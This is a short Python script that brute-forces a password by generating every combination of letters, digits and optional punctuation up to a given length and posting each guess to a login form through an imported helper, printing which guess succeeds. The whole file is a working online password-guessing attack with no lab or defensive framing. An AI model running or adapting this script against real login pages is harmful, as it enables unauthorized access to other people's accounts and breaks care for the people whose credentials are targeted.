import string
from SendPostForm import PostRequest
from itertools import chain, product

printable = list(string.ascii_letters) + list(string.digits)
special_c = list(string.punctuation)



def bruteforce(SessionData, maxlength, HasSpecialCH=False):
        for candidate in chain.from_iterable(product(printable+(special_c*HasSpecialCH), repeat=i) for i in range(1, maxlength + 1)):
            password = "".join(candidate)
            if PostRequest(SessionData, password):
                print("Password Found!:"+password)
            else:
                print("Failed using:"+password)
     
